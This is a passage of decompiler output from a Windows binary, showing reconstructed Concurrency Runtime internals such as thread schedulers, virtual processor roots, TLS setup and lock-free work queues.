    else
    {
      result = sub_44AD6E(*((_DWORD *)Context + 41), (int)sub_45B445, (int)Context);
      *((_DWORD *)Context + 43) = result;
      if ( !result )
      {
        LastError = GetLastError();
        if ( LastError <= 0 )
          goto LABEL_11;
LABEL_10:
        LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_11:
        sub_452A0F(pExceptionObject, LastError);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
      }
    }
  }
  return result;
}
// 44CE8E: using guessed type int sub_44CE8E(void);
// 45B4C7: using guessed type _DWORD pExceptionObject[4];

//----- (0045B5A0) --------------------------------------------------------
int __thiscall sub_45B5A0(int this)
{
  int result; // eax

  sub_453698((int *)this);
  result = *(_DWORD *)(this + 164);
  if ( result )
  {
    result = CloseHandle(*(HANDLE *)(this + 164));
    *(_DWORD *)(this + 164) = 0;
  }
  return result;
}

//----- (0045B5C2) --------------------------------------------------------
int __thiscall sub_45B5C2(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);
}

//----- (0045B5DA) --------------------------------------------------------
signed __int32 __thiscall sub_45B5DA(int this)
{
  int v2; // ebx
  int v3; // eax
  signed __int32 v4; // eax
  signed __int32 result; // eax
  bool v6; // cf
  char pExceptionObject[12]; // [esp+4h] [ebp-10h] BYREF
  int v8; // [esp+10h] [ebp-4h]

  v8 = this;
  if ( (LPVOID)this == sub_4501C0() )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVcontext_self_unblock_Concurrency__);
  }
  v2 = *(_DWORD *)(this + 8);
  v3 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  sub_453A71(4, 4u, v3, v2);
  v4 = _InterlockedDecrement((volatile signed __int32 *)(v8 + 44));
  if ( !v4 )
    return SetEvent(*(HANDLE *)(v8 + 168));
  v6 = v4 == -1;
  result = v4 + 1;
  if ( !v6 && result != 1 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVcontext_unblock_unbalanced_Concurrency__);
  }
  return result;
}
// 4F5B48: using guessed type __TI_flags _TI2_AVcontext_self_unblock_Concurrency__;

//----- (0045B662) --------------------------------------------------------
BOOL __thiscall sub_45B662(int this)
{
  int v1; // ebx
  int v2; // eax

  v1 = *(_DWORD *)(this + 8);
  v2 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 28) + 4))(*(_DWORD *)(this + 28));
  sub_453A71(5, 4u, v2, v1);
  return SwitchToThread();
}

//----- (0045B69D) --------------------------------------------------------
_DWORD *__thiscall sub_45B69D(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  sub_4582F1(this, a2);
  *this = &Concurrency::details::ThreadInternalContext::`vftable';
  result = this;
  this[1] = &Concurrency::details::ThreadInternalContext::`vftable';
  return result;
}
// 4943C4: using guessed type void *Concurrency::details::ThreadInternalContext::`vftable';
// 4943EC: using guessed type void *Concurrency::details::ThreadInternalContext::`vftable';

//----- (0045B6C3) --------------------------------------------------------
HANDLE *__thiscall sub_45B6C3(HANDLE *this, const void **a2)
{
  HANDLE *result; // eax

  *this = &Concurrency::IScheduler::`vftable';
  sub_44F00F(this + 2, a2);
  *this = &Concurrency::details::ThreadScheduler::`vftable';
  result = this;
  this[2] = &Concurrency::details::ThreadScheduler::`vftable';
  return result;
}
// 4943A4: using guessed type void *Concurrency::IScheduler::`vftable';
// 494438: using guessed type void *Concurrency::details::ThreadScheduler::`vftable';
// 494458: using guessed type void *Concurrency::details::ThreadScheduler::`vftable';

//----- (0045B6F4) --------------------------------------------------------
void __thiscall sub_45B6F4(char *this)
{
  char *v1; // ecx

  *(_DWORD *)this = &Concurrency::details::ThreadScheduler::`vftable';
  v1 = this + 8;
  *(_DWORD *)v1 = &Concurrency::details::ThreadScheduler::`vftable';
  sub_44F4B8(v1);
}
// 494438: using guessed type void *Concurrency::details::ThreadScheduler::`vftable';
// 494458: using guessed type void *Concurrency::details::ThreadScheduler::`vftable';

//----- (0045B708) --------------------------------------------------------
_DWORD *__thiscall sub_45B708(_DWORD *this, char a2)
{
  _DWORD *v2; // esi

  v2 = this - 1;
  *(this - 1) = &Concurrency::details::ThreadInternalContext::`vftable';
  *this = &Concurrency::details::ThreadInternalContext::`vftable';
  sub_4583D4(this - 1);
  if ( (a2 & 1) != 0 )
    sub_44775B(v2);
  return v2;
}
// 4943C4: using guessed type void *Concurrency::details::ThreadInternalContext::`vftable';
// 4943EC: using guessed type void *Concurrency::details::ThreadInternalContext::`vftable';

//----- (0045B74A) --------------------------------------------------------
char *__thiscall sub_45B74A(char *Block, char a2)
{
  sub_45B6F4(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}

//----- (0045B76F) --------------------------------------------------------
int __thiscall sub_45B76F(void *this, int a2, unsigned int a3)
{
  return sub_44FA12((int)this + 8, a2, a3);
}

//----- (0045B77B) --------------------------------------------------------
HANDLE *__cdecl sub_45B77B(const void **a1)
{
  HANDLE *v1; // ecx
  HANDLE *result; // eax

  v1 = (HANDLE *)operator new(0x210u);
  result = 0;
  if ( v1 )
    return sub_45B6C3(v1, a1);
  return result;
}

//----- (0045B7AE) --------------------------------------------------------
_DWORD *__fastcall sub_45B7AE(int a1)
{
  _DWORD *v2; // edx
  _DWORD *result; // eax

  v2 = operator new(0xF0u);
  result = 0;
  if ( v2 )
    return sub_45B69D(v2, a1 != 8 ? a1 : 0);
  return result;
}

//----- (0045B7EC) --------------------------------------------------------
_DWORD *__stdcall sub_45B7EC(int a1, int a2)
{
  _DWORD *v2; // ecx
  _DWORD *result; // eax

  v2 = operator new(0xE8u);
  result = 0;
  if ( v2 )
    return sub_45DFB7(v2, a1, a2);
  return result;
}

//----- (0045B824) --------------------------------------------------------
char *__thiscall sub_45B824(char *this)
{
  return this - 8;
}

//----- (0045B828) --------------------------------------------------------
int __thiscall sub_45B828(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[2] + 4))(this + 2);
}

//----- (0045B841) --------------------------------------------------------
_DWORD *__thiscall sub_45B841(const void **this, _DWORD *a2)
{
  sub_450A6C(this + 2, a2);
  return a2;
}

//----- (0045B856) --------------------------------------------------------
_DWORD *__thiscall sub_45B856(const void **this, _DWORD *a2)
{
  return sub_45B841(this - 2, a2);
}

//----- (0045B85E) --------------------------------------------------------
int __thiscall sub_45B85E(_DWORD *this, int a2, unsigned int a3)
{
  return sub_451EAC(this + 2, a2, a3);
}

//----- (0045B86A) --------------------------------------------------------
union _SLIST_HEADER *__thiscall sub_45B86A(union _SLIST_HEADER *this, _DWORD *a2, _DWORD *a3, union _SLIST_HEADER *a4)
{
  return sub_452251(this + 1, a2, a3, a4);
}

//----- (0045B876) --------------------------------------------------------
DWORD sub_45B876()
{
  DWORD result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = TlsAlloc();
  dwTlsIndex = result;
  if ( result == -1 )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_452A0F(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 45B876: using guessed type _DWORD pExceptionObject[4];

//----- (0045B8B8) --------------------------------------------------------
BOOL sub_45B8B8()
{
  BOOL result; // eax

  result = TlsFree(dwTlsIndex);
  dwTlsIndex = 0;
  return result;
}

//----- (0045B8CC) --------------------------------------------------------
signed __int32 __thiscall sub_45B8CC(volatile signed __int32 *this, int a2)
{
  volatile signed __int32 *v2; // esi
  signed __int32 v3; // edx
  signed __int32 v4; // ecx
  signed __int32 result; // eax

  v2 = this + 6;
  v3 = *((_DWORD *)this + 6);
  v4 = v3;
  for ( result = v3; ; v4 = result )
  {
    result = _InterlockedCompareExchange(v2, a2 | v4 & 0xFFFFFFFC, result);
    if ( result == v3 )
      break;
    v3 = result;
  }
  return result;
}

//----- (0045B8F2) --------------------------------------------------------
int __thiscall sub_45B8F2(_DWORD *this, unsigned int *a2)
{
  int result; // eax
  unsigned int v3; // ecx

  result = this[2];
  v3 = 0;
  if ( (result & 1) != 0 )
  {
    v3 = result & 0xFFFFFFFE;
    if ( (result & 0xFFFFFFFE) != 0 )
      result = *(_DWORD *)(v3 + 104);
    else
      result = 2;
  }
  if ( a2 )
    *a2 = v3;
  return result;
}

//----- (0045B91A) --------------------------------------------------------
char __thiscall sub_45B91A(volatile signed __int32 *this)
{
  signed __int32 v1; // edx
  signed __int32 v2; // eax

  v1 = *((_DWORD *)this + 6);
  if ( (v1 & 3) != 0 )
    return 0;
  while ( 1 )
  {
    v2 = _InterlockedCompareExchange(this + 6, v1 | 1, v1);
    if ( v2 == v1 )
      break;
    v1 = v2;
    if ( (v2 & 3) != 0 )
      return 0;
  }
  return 1;
}

//----- (0045B942) --------------------------------------------------------
signed __int32 __thiscall sub_45B942(volatile signed __int32 *this)
{
  volatile signed __int32 *v1; // edi
  signed __int32 i; // edx
  signed __int32 result; // eax
  signed __int32 v4; // eax
  _QWORD *v5; // eax
  unsigned int v6; // esi
  volatile signed __int32 v7; // edx
  volatile signed __int32 v8; // ecx

  v1 = this + 6;
  for ( i = *((_DWORD *)this + 6); ; i = v4 )
  {
    result = i & 0xFFFFFFFC;
    if ( (i & 0xFFFFFFFC) != 0 && result != 12 )
      break;
    v4 = _InterlockedCompareExchange(v1, i & 3 | 8, i);
    if ( v4 == i )
    {
      v5 = operator new(8u);
      v6 = (unsigned int)v5;
      if ( v5 )
        sub_405C60(v5);
      else
        v6 = 0;
      v7 = *v1;
      v8 = *v1;
      for ( result = *v1; ; LOBYTE(v8) = result )
      {
        result = _InterlockedCompareExchange(v1, v6 | v8 & 3, result);
        if ( result == v7 )
          break;
        v7 = result;
      }
      return result;
    }
  }
  return result;
}

//----- (0045B9A0) --------------------------------------------------------
void __thiscall sub_45B9A0(_DWORD *this)
{
  void *v2; // esi
  int v3; // ecx
  int v4[6]; // [esp-8h] [ebp-30h] BYREF
  char Block[20]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+24h] [ebp-4h]

  v2 = (void *)(this[6] & 0xFFFFFFFC);
  if ( v2 && v2 != (void *)12 )
  {
    __ExceptionPtrCopy(Block, (const void *)(this[6] & 0xFFFFFFFC));
    v6 = 0;
    __ExceptionPtrDestroy(v2);
    sub_44775B(v2);
    this[6] = 0;
    if ( !(unsigned __int8)__uncaught_exception() )
    {
      v4[1] = v3;
      v4[0] = v3;
      sub_405C40(v4, Block);
      sub_405C90(v4[0]);
    }
    __ExceptionPtrDestroy(Block);
  }
}
// 45B9F7: variable 'v3' is possibly undefined
// 4604BB: using guessed type int __uncaught_exception(void);

//----- (0045BA07) --------------------------------------------------------
_DWORD *__thiscall sub_45BA07(_DWORD *this, int a2)
{
  int v3; // eax
  _DWORD *v4; // ecx
  int v5; // edx

  this[4] = a2;
  *this = 0;
  this[1] = 0;
  this[6] = 0;
  *((_BYTE *)this + 20) = 0;
  this[3] = 0;
  this[2] = 63;
  this[7] = unknown_libname_86(256);
  v3 = unknown_libname_86(512);
  if ( v3 )
  {
    v4 = (_DWORD *)v3;
    v5 = 64;
    do
    {
      *v4 = 0;
      v4 += 2;
      *(v4 - 1) = 0;
      --v5;
    }
    while ( v5 );
  }
  else
  {
    v3 = 0;
  }
  this[8] = v3;
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0045BA76) --------------------------------------------------------
_DWORD *__thiscall sub_45BA76(_DWORD *this)
{
  _DWORD *v2; // esi
  Concurrency::details::platform *v4; // [esp+0h] [ebp-20h]

  v2 = this + 28;
  sub_456E76(this, (int)(this + 28));
  this[14] = 0;
  this[18] = 0;
  sub_45BA07(this + 19, (int)v2);
  *v2 = 0;
  this[11] = 0;
  this[13] = this;
  this[16] = Concurrency::details::platform::GetNextAsyncId(v4);
  return this;
}
// 45BAB0: variable 'v4' is possibly undefined

//----- (0045BAC0) --------------------------------------------------------
int __thiscall sub_45BAC0(int this, int a2)
{
  *(_DWORD *)(this + 60) = a2;
  return sub_451340(
           (int (__cdecl **)(int))(this + 28),
           (int (__cdecl *)(int))sub_45BB42,
           (int (__cdecl *)(int))this,
           *(_DWORD *)(*(_DWORD *)(a2 + 256) + 4));
}

//----- (0045BAE4) --------------------------------------------------------
int __thiscall sub_45BAE4(volatile __int32 *this)
{
  Concurrency::details::platform *v3; // [esp+0h] [ebp-8h]

  sub_44AE12(this + 28);
  *((_DWORD *)this + 16) = Concurrency::details::platform::GetNextAsyncId(v3);
  *this = 0;
  *((_DWORD *)this + 1) = 0;
  *((_DWORD *)this + 19) = 0;
  *((_DWORD *)this + 20) = 0;
  *((_DWORD *)this + 25) = 0;
  *((_BYTE *)this + 96) = 0;
  *((_DWORD *)this + 22) = 0;
  *((_DWORD *)this + 14) = 0;
  *((_DWORD *)this + 18) = 0;
  return sub_44AE53((_DWORD *)this + 28);
}
// 45BAF0: variable 'v3' is possibly undefined

//----- (0045BB1E) --------------------------------------------------------
int __thiscall sub_45BB1E(int this, int a2)
{
  *(_DWORD *)(this + 60) = a2;
  return sub_451340(
           (int (__cdecl **)(int))(this + 28),
           sub_45BB53,
           (int (__cdecl *)(int))this,
           *(_DWORD *)(*(_DWORD *)(a2 + 256) + 4));
}

//----- (0045BB42) --------------------------------------------------------
volatile signed __int32 *__cdecl sub_45BB42(int a1)
{
  return sub_45AA36(*(_DWORD **)(a1 + 60), a1);
}

//----- (0045BB53) --------------------------------------------------------
signed __int32 __cdecl sub_45BB53(int a1)
{
  return sub_45ABC8(*(union _SLIST_HEADER **)(a1 + 60), a1);
}

//----- (0045BB64) --------------------------------------------------------
__int32 __thiscall sub_45BB64(volatile __int32 *this, char a2)
{
  _DWORD *v3; // esi
  __int32 v4; // edi

  v3 = this + 28;
  sub_44AE12(this + 28);
  v4 = sub_45BD63((int)this, a2);
  sub_44AE53(v3);
  return v4;
}

//----- (0045BBA7) --------------------------------------------------------
int __thiscall sub_45BBA7(
        volatile __int32 *this,
        unsigned __int8 (__cdecl *a2)(int, int),
        int a3,
        int (__cdecl *a4)(int, int))
{
  volatile __int32 *v5; // eax
  __int32 v6; // edi
  __int32 v7; // esi
  int v8; // edx
  int v9; // eax
  char v10; // al
  volatile __int32 *v12; // [esp+10h] [ebp-1Ch]
  int v13; // [esp+18h] [ebp-14h]
  int v14; // [esp+1Ch] [ebp-10h]

  v12 = (volatile __int32 *)*((_DWORD *)this + 4);
  sub_44AE12(v12);
  v5 = this + 1;
  v6 = *((_DWORD *)this + 1);
  v7 = v6 - 1;
  if ( v6 - 1 >= *this )
  {
    v14 = *((_DWORD *)this + 1);
    v8 = v14;
    do
    {
      v9 = *(_DWORD *)(*((_DWORD *)this + 7) + 4 * (v7 & this[2]));
      v13 = v9;
      if ( v9 )
      {
        if ( a2(v9, a3) )
        {
          v10 = a4(v13, a3);
          v8 = v14;
          if ( v10 )
          {
            if ( v14 == v6 )
              --v6;
            else
              *(_DWORD *)(*((_DWORD *)this + 7) + 4 * (v7 & this[2])) = 0;
          }
        }
        else
        {
          v8 = v14;
        }
      }
      --v7;
      v14 = --v8;
    }
    while ( v7 >= *this );
    v5 = this + 1;
  }
  _InterlockedExchange(v5, v6);
  return sub_44AE53(v12);
}

//----- (0045BC5B) --------------------------------------------------------
int __thiscall sub_45BC5B(
        volatile __int32 *this,
        unsigned __int8 (__cdecl *a2)(int, int),
        int a3,
        int (__cdecl *a4)(int, int))
{
  return sub_45BBA7(this + 19, a2, a3, a4);
}

//----- (0045BC67) --------------------------------------------------------
__int32 __thiscall sub_45BC67(volatile __int32 *this, char a2, char *a3)
{
  __int32 v4; // ebx
  char v5; // cl

  v4 = 0;
  if ( sub_44AE67(this + 28) )
  {
    v4 = sub_45BD63((int)this, a2);
    sub_44AE53((_DWORD *)this + 28);
    v5 = 1;
  }
  else
  {
    v5 = 0;
  }
  *a3 = v5;
  return v4;
}

//----- (0045BCD5) --------------------------------------------------------
__int32 __thiscall sub_45BCD5(int this, char a2, int a3)
{
  int v4; // ecx
  __int32 v5; // ebx
  volatile __int32 v6; // edi

LABEL_11:
  v5 = 0;
  while ( 1 )
  {
    v6 = *(_DWORD *)this;
    _InterlockedExchange((volatile __int32 *)this, *(_DWORD *)this + 1);
    if ( v6 >= *(_DWORD *)(this + 4) )
    {
      *(_DWORD *)this = v6;
      return v5;
    }
    v4 = v6 & *(_DWORD *)(this + 8);
    if ( (*(_BYTE *)(*(_DWORD *)(this + 28) + 4 * v4) & 1) != 0
      && !a2
      && sub_457EE6((_DWORD *)(*(_DWORD *)(this + 32) + 8 * v4)) )
    {
      break;
    }
    if ( *(_BYTE *)(this + 20) && *(_DWORD *)this >= *(_DWORD *)(this + 24) )
      *(_BYTE *)(this + 20) = 0;
    v5 = _InterlockedExchange((volatile __int32 *)(*(_DWORD *)(this + 28) + 4 * (v6 & *(_DWORD *)(this + 8))), 0);
    if ( v5 )
    {
      if ( (v5 & 1) == 0 )
        return v5;
      v5 &= ~1u;
      if ( sub_453082((int *)(*(_DWORD *)(this + 32) + 8 * (v6 & *(_DWORD *)(this + 8))), 0) )
        return v5;
      goto LABEL_11;
    }
  }
  *(_DWORD *)this = v6;
  return 0;
}

//----- (0045BD63) --------------------------------------------------------
__int32 __thiscall sub_45BD63(int this, char a2)
{
  __int32 result; // eax
  int *v4; // eax
  _BYTE *v5; // edi
  LPVOID v6; // eax
  int v7; // eax
  __int32 v8; // eax
  volatile signed __int32 *v9; // ecx

  if ( sub_45A871((_DWORD *)this) )
    return 0;
  v4 = *(int **)(this + 72);
  v5 = 0;
  if ( v4 && v4[28] > 0 && !(*(unsigned __int8 (__thiscall **)(int *))(*v4 + 16))(v4) )
  {
    if ( !*(_BYTE *)(this + 96) || (v5 = (_BYTE *)sub_45BCD5(this + 76, a2, 1)) == 0 )
    {
      v6 = sub_4501C0();
      if ( v6 )
        v7 = (int)v6 + 175;
      else
        v7 = 179;
      *(_BYTE *)v7 |= 2u;
      return (__int32)v5;
    }
    goto LABEL_17;
  }
  result = sub_4580B8((int *)this, a2);
  if ( result )
    return result;
  v8 = sub_45BCD5(this + 76, a2, 0);
  v5 = (_BYTE *)v8;
  if ( v8 )
  {
    v9 = *(volatile signed __int32 **)(this + 72);
    if ( !v9 || *(volatile signed __int32 **)(*(_DWORD *)(v8 + 8) + 12) != v9 )
    {
LABEL_17:
      sub_45BF1A(v5, 1);
      return (__int32)v5;
    }
    sub_453693(v9);
    sub_45BF1A(v5, 0);
  }
  return (__int32)v5;
}

//----- (0045BE1F) --------------------------------------------------------
void __cdecl sub_45BE1F(int a1)
{
  _InterlockedExchange((volatile __int32 *)(a1 + 116), 1);
  sub_452EEA(a1, -999);
  sub_452F81(a1, 0);
}

//----- (0045BE46) --------------------------------------------------------
int __cdecl sub_45BE46(int (__thiscall ***a1)(_DWORD, int))
{
  return (**a1)(a1, 1);
}

//----- (0045BE64) --------------------------------------------------------
void __thiscall sub_45BE64(_DWORD *this, int a2)
{
  if ( (signed __int32 (__cdecl *)(int))this[3] == sub_45BF27 )
    sub_45BE7C(this, a2);
  else
    sub_45BEB2((int)this, a2);
}

//----- (0045BE7C) --------------------------------------------------------
void __thiscall sub_45BE7C(_DWORD *this, int a2)
{
  int v2; // edx
  int v3; // eax
  volatile signed __int32 *v4; // ecx

  if ( !*(_DWORD *)(a2 != 0 ? a2 - 4 + 0x34 : 52) )
  {
    v3 = this[2];
    v4 = *(volatile signed __int32 **)(v3 + 12);
    *(_DWORD *)(a2 != 0 ? a2 - 4 + 0x34 : 52) = v3;
    *(_DWORD *)(a2 != 0 ? a2 - 4 + 0x38 : 56) = v3;
    v2 = a2 != 0 ? a2 - 4 : 0;
    sub_452E5D(v4, v2 != 0 ? v2 + 4 : 0, 0);
  }
}

//----- (0045BEB2) --------------------------------------------------------
void __thiscall sub_45BEB2(int this, int a2)
{
  int v2; // edx
  int v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // eax
  volatile signed __int32 *v6; // [esp+0h] [ebp-4h]

  v2 = a2 != 0 ? a2 - 4 : 0;
  if ( !*(_DWORD *)(v2 + 0x34) )
  {
    v3 = *(_DWORD *)(this + 8);
    v4 = v2 + 4;
    v5 = *(volatile signed __int32 **)(v3 + 12);
    *(_DWORD *)(a2 != 0 ? a2 - 4 + 0x34 : 52) = v3;
    *(_DWORD *)(a2 != 0 ? a2 - 4 + 0x38 : 56) = v3;
    v6 = v5;
    if ( *(_BYTE *)(this + 17) )
    {
      *(_BYTE *)(a2 != 0 ? a2 - 4 + 0x51 : 81) = 0;
      sub_452EB6(v3 + 28, (_DWORD *)(v2 + 96));
    }
    else
    {
      sub_44A220((volatile signed __int32 *)(v3 + 32));
      ++*(_DWORD *)(v3 + 48);
      sub_44A33A((volatile signed __int32 *)(v3 + 32));
      sub_452E5D(v6, v4, 1);
    }
  }
}

//----- (0045BF1A) --------------------------------------------------------
char __thiscall sub_45BF1A(_BYTE *this, char a2)
{
  char result; // al

  result = a2;
  this[17] = a2;
  return result;
}

//----- (0045BF27) --------------------------------------------------------
signed __int32 __cdecl sub_45BF27(int a1)
{
  char *v1; // eax
  char *v2; // ebx
  _DWORD *v3; // esi
  void *v4; // eax
  int v5; // ecx
  char pExceptionObject[12]; // [esp+10h] [ebp-38h] BYREF
  int v8; // [esp+1Ch] [ebp-2Ch]
  _DWORD *v9; // [esp+20h] [ebp-28h]
  char *v10; // [esp+24h] [ebp-24h]
  volatile signed __int32 *v11; // [esp+28h] [ebp-20h]
  void *v12; // [esp+2Ch] [ebp-1Ch]
  char *v13; // [esp+30h] [ebp-18h]
  _DWORD *v14; // [esp+34h] [ebp-14h]
  int v15; // [esp+44h] [ebp-4h]

  v1 = (char *)sub_4501C0();
  if ( v1 )
  {
    v2 = v1 - 4;
    v13 = v1 - 4;
  }
  else
  {
    v2 = 0;
    v13 = 0;
  }
  v10 = v2;
  v3 = *(_DWORD **)(a1 + 8);
  v14 = v3;
  v12 = (void *)v3[3];
  v9 = v2 + 4;
  sub_45BE7C((_DWORD *)a1, v2 != 0 ? (unsigned int)(v2 + 4) : 0);
  v4 = (void *)sub_45B8F2(v3, 0);
  v11 = 0;
  v8 = (int)v4;
  if ( v4 && v4 != (void *)2 )
    v11 = (volatile signed __int32 *)sub_4544E4(v4, (int)sub_45BE1F, v2 != 0 ? (unsigned int)(v2 + 4) : 0, 1);
  v15 = 0;
  if ( v3[6] )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AV_Interruption_exception_details_Concurrency__);
  }
  (*(void (__cdecl **)(int))(a1 + 4))(a1);
  v15 = -1;
  sub_453890(v12, v2 != 0 ? (unsigned int)v9 : 0);
  if ( v11 )
  {
    sub_406AD0(v8, (int)v11);
    sub_406830(v11);
  }
  v5 = (int)v14;
  *((_DWORD *)v2 + 27) = -1;
  *((_DWORD *)v2 + 28) = -1;
  *((_DWORD *)v2 + 29) = 0;
  *((_DWORD *)v2 + 30) = 0;
  *((_DWORD *)v2 + 13) = 0;
  *((_DWORD *)v2 + 14) = 0;
  *(_DWORD *)(a1 + 8) = 0;
  return sub_4542AB(v5);
}

//----- (0045C076) --------------------------------------------------------
_DWORD *__thiscall sub_45C076(_DWORD *this, int a2, _DWORD *a3, int a4)
{
  _DWORD *result; // eax

  *this = &Concurrency::details::VirtualProcessorRoot::`vftable';
  this[1] = 0;
  sub_454A6E(this + 2, a2, a3, a4);
  *((_WORD *)this + 34) = 0;
  this[19] = 0;
  this[18] = _InterlockedIncrement(dword_5000AC);
  result = this;
  this[9] = this;
  return result;
}
// 4944BC: using guessed type void *Concurrency::details::VirtualProcessorRoot::`vftable';
// 5000AC: using guessed type signed __int32 dword_5000AC[19];

//----- (0045C0BE) --------------------------------------------------------
_DWORD *__thiscall sub_45C0BE(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::VirtualProcessorRoot::`vftable';
  Block[2] = &Concurrency::details::ExecutionResource::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493E04: using guessed type void *Concurrency::details::ExecutionResource::`vftable';
// 4944BC: using guessed type void *Concurrency::details::VirtualProcessorRoot::`vftable';

//----- (0045C0E8) --------------------------------------------------------
int __thiscall sub_45C0E8(_DWORD *this)
{
  return sub_454B1A(this + 2);
}

//----- (0045C0F0) --------------------------------------------------------
int __thiscall sub_45C0F0(_DWORD *this)
{
  return this[13];
}

//----- (0045C0F4) --------------------------------------------------------
int __thiscall sub_45C0F4(_DWORD *this)
{
  return this[18];
}

//----- (0045C0F8) --------------------------------------------------------
int __thiscall sub_45C0F8(int *this, int a2)
{
  char pExceptionObject[12]; // [esp+4h] [ebp-Ch] BYREF

  if ( !a2 )
  {
    sub_42E473(pExceptionObject, (int)"pScheduler");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  if ( *(_DWORD *)(this[7] + 8) != a2 )
  {
    std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
  }
  sub_45C150((int)this);
  return sub_455BBF(this[7], (int)this);
}

//----- (0045C150) --------------------------------------------------------
unsigned int __thiscall sub_45C150(int this)
{
  unsigned int result; // eax

  result = _InterlockedDecrement((volatile signed __int32 *)(this + 76));
  if ( !result )
    return sub_45C173((_DWORD **)this);
  return result;
}

//----- (0045C166) --------------------------------------------------------
unsigned __int32 __thiscall sub_45C166(_DWORD **this)
{
  return sub_45602B(this[7], (int)(this + 2));
}

//----- (0045C173) --------------------------------------------------------
unsigned int __thiscall sub_45C173(_DWORD **this)
{
  return sub_455A48(this[7], (int)(this + 2));
}

//----- (0045C180) --------------------------------------------------------
_DWORD *__thiscall sub_45C180(_DWORD *this, int a2, _DWORD *a3, int a4)
{
  _DWORD *result; // eax

  sub_45C076(this, a2, a3, a4);
  *this = &Concurrency::details::FreeVirtualProcessorRoot::`vftable';
  result = this;
  this[20] = 0;
  this[21] = 0;
  return result;
}
// 4944E8: using guessed type void *Concurrency::details::FreeVirtualProcessorRoot::`vftable';

//----- (0045C1B3) --------------------------------------------------------
bool __thiscall sub_45C1B3(_WORD *this, int a2)
{
  return *(_WORD *)(a2 + 4) == this[2] && *(_DWORD *)a2 == *(_DWORD *)this;
}

//----- (0045C1D3) --------------------------------------------------------
_DWORD *__thiscall sub_45C1D3(_DWORD *Block, char a2)
{
  *Block = &Concurrency::details::VirtualProcessorRoot::`vftable';
  Block[2] = &Concurrency::details::ExecutionResource::`vftable';
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 493E04: using guessed type void *Concurrency::details::ExecutionResource::`vftable';
// 4944BC: using guessed type void *Concurrency::details::VirtualProcessorRoot::`vftable';

//----- (0045C1FD) --------------------------------------------------------
int __thiscall sub_45C1FD(_DWORD *this)
{
  int result; // eax
  char v3[8]; // [esp+8h] [ebp-10h] BYREF
  int v4; // [esp+10h] [ebp-8h]
  void (*v5)(); // [esp+14h] [ebp-4h]

  v5 = sub_44AE5E;
  v4 = 0;
  while ( !this[1] )
    sub_449592((int)v3);
  result = this[1];
  this[1] = 0;
  return result;
}
// 45C1FD: using guessed type char var_10[8];

//----- (0045C22C) --------------------------------------------------------
int __thiscall sub_45C22C(int this, __int32 a2)
{
  __int32 v2; // edi
  int (__thiscall **v4)(void *); // esi
  int result; // eax
  char pExceptionObject[12]; // [esp+Ch] [ebp-Ch] BYREF

  v2 = a2;
  if ( !a2 )
  {
    sub_42E473(pExceptionObject, (int)"pContext");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v4 = (int (__thiscall **)(void *))(*(int (__thiscall **)(__int32))(*(_DWORD *)a2 + 8))(a2);
  if ( !v4 )
  {
    v2 = a2;
    v4 = (int (__thiscall **)(void *))(*(int (__thiscall **)(_DWORD, __int32))(**(_DWORD **)(this + 28) + 28))(
                                        *(_DWORD *)(this + 28),
                                        a2);
  }
  if ( _InterlockedIncrement((volatile signed __int32 *)(this + 76)) == 2 )
  {
    result = this + 4;
    _InterlockedExchange((volatile __int32 *)(this + 4), v2);
  }
  else
  {
    sub_45C53C((_DWORD *)this);
    if ( *(_DWORD *)(this + 80) )
    {
      if ( v4 != *(int (__thiscall ***)(void *))(this + 80) )
      {
        std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVinvalid_operation_Concurrency__);
      }
    }
    *(_DWORD *)(this + 84) = 0;
    sub_45C166((_DWORD **)this);
    sub_45C2EB((int (__thiscall ***)(void *))this, v4);
    return sub_45C8DF((HANDLE *)v4);
  }
  return result;
}

//----- (0045C2EB) --------------------------------------------------------
int __thiscall sub_45C2EB(int (__thiscall ***this)(void *), int (__thiscall **a2)(void *))
{
  int (__thiscall **v3)(void *); // ebx
  int v4; // eax

  sub_45C901(a2);
  this[20] = a2;
  a2[4] = (int (__thiscall *)(void *))this;
  v3 = this[7];
  v4 = (**this)(this);
  return sub_45C506((int)a2, *((_DWORD *)v3[4] + 13 * v4), *((_WORD *)v3[4] + 26 * v4 + 6), 0);
}

//----- (0045C352) --------------------------------------------------------
char __thiscall sub_45C352(int this, int a2)
{
  int v3; // esi
